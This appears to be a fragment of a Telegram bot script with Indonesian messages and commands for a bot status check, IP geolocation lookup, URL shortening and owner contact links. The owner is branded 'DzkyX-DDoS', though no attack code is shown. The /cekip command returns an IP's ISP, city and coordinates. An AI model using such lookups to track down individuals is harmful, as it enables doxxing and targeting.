bot.onText(/\/cekbot/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Haii Kak, Bot Online ( Aktif ), Jika Bot Off Mungkin Sedang Maintenance Atau Hubungi Owner Kami Makasih⬇️",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Nagato', url: `https://t.me/DirtyHead5` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip ip nya ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : SkyranXMods
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL harus dimulai dengan "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat mempersingkat URL.');
  }
});

bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'WhatsApp',
          url: 'https://wa.me/6289514427562'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/DirtyHead5'
        },
        {
          text: 'YouTube',
          url: 'https://www.youtube.com/@Dzakimin'
        }
      ];
      bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa terhubung dengan owner DzkyX-DDoS melalui link di bawah:`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


